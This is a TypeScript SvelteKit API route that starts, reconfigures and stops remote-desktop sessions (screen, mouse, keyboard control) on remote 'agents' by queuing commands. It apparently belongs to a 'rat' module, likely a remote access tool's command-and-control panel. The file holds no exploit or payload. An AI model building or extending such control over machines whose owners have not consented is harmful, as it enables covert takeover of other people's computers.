import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { registry, RegistryError } from '$lib/server/rat/store';
import { remoteDesktopManager, RemoteDesktopError } from '$lib/server/rat/remote-desktop';
import type {
	RemoteDesktopSessionResponse,
	RemoteDesktopSettings,
	RemoteDesktopSettingsPatch
} from '$lib/types/remote-desktop';
import type { RemoteDesktopCommandPayload } from '$lib/types/remote-desktop';

function normalizeSettings(input: Record<string, unknown>): RemoteDesktopSettingsPatch {
	const output: RemoteDesktopSettingsPatch = {};
	if (typeof input.quality === 'string') {
		output.quality = input.quality as RemoteDesktopSettings['quality'];
	}
	if (typeof input.mode === 'string') {
		output.mode = input.mode as RemoteDesktopSettings['mode'];
	}
	if (typeof input.monitor === 'number') {
		output.monitor = input.monitor;
	}
	if (typeof input.mouse === 'boolean') {
		output.mouse = input.mouse;
	}
	if (typeof input.keyboard === 'boolean') {
		output.keyboard = input.keyboard;
	}
	return output;
}

export const GET: RequestHandler = ({ params }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	const session = remoteDesktopManager.getSessionState(id);
	return json({ session } satisfies RemoteDesktopSessionResponse);
};

export const POST: RequestHandler = async ({ params, request }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	let body: Record<string, unknown> = {};
	try {
		body = (await request.json()) as Record<string, unknown>;
	} catch {
		body = {};
	}

	try {
		const settings = normalizeSettings(body);
		const session = remoteDesktopManager.createSession(id, settings);

		try {
			const payload: RemoteDesktopCommandPayload = {
				action: 'start',
				sessionId: session.sessionId,
				settings: session.settings
			};
			registry.queueCommand(id, { name: 'remote-desktop', payload });
		} catch (err) {
			remoteDesktopManager.closeSession(id);
			if (err instanceof RegistryError) {
				throw error(err.status, err.message);
			}
			throw error(500, 'Failed to queue remote desktop command');
		}

		return json({ session } satisfies RemoteDesktopSessionResponse, { status: 201 });
	} catch (err) {
		if (err instanceof RemoteDesktopError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to create remote desktop session');
	}
};

export const PATCH: RequestHandler = async ({ params, request }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	let body: Record<string, unknown>;
	try {
		body = (await request.json()) as Record<string, unknown>;
	} catch {
		throw error(400, 'Invalid session payload');
	}

	const updates = normalizeSettings(body);
	const session = remoteDesktopManager.getSession(id);
	if (!session || !session.active) {
		throw error(404, 'No active remote desktop session');
	}

	if (typeof body.sessionId === 'string' && body.sessionId !== session.id) {
		throw error(409, 'Session identifier mismatch');
	}

	try {
		remoteDesktopManager.updateSettings(id, updates);
	} catch (err) {
		if (err instanceof RemoteDesktopError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to update session settings');
	}

	if (Object.keys(updates).length > 0) {
		const payload: RemoteDesktopCommandPayload = {
			action: 'configure',
			sessionId: session.id,
			settings: updates
		};
		try {
			registry.queueCommand(id, { name: 'remote-desktop', payload });
		} catch (err) {
			if (err instanceof RegistryError) {
				throw error(err.status, err.message);
			}
			throw error(500, 'Failed to queue configuration command');
		}
	}

	const next = remoteDesktopManager.getSessionState(id);
	return json({ session: next } satisfies RemoteDesktopSessionResponse);
};

export const DELETE: RequestHandler = async ({ params, request }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	let body: Record<string, unknown> = {};
	try {
		body = (await request.json()) as Record<string, unknown>;
	} catch {
		body = {};
	}

	const session = remoteDesktopManager.getSession(id);
	if (!session || !session.active) {
		const state = remoteDesktopManager.getSessionState(id);
		return json({ session: state } satisfies RemoteDesktopSessionResponse);
	}

	if (typeof body.sessionId === 'string' && body.sessionId !== session.id) {
		throw error(409, 'Session identifier mismatch');
	}

	const payload: RemoteDesktopCommandPayload = {
		action: 'stop',
		sessionId: session.id
	};

	try {
		registry.queueCommand(id, { name: 'remote-desktop', payload });
	} catch (err) {
		if (err instanceof RegistryError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to queue stop command');
	}

	remoteDesktopManager.closeSession(id);
	const state = remoteDesktopManager.getSessionState(id);
	return json({ session: state } satisfies RemoteDesktopSessionResponse);
};
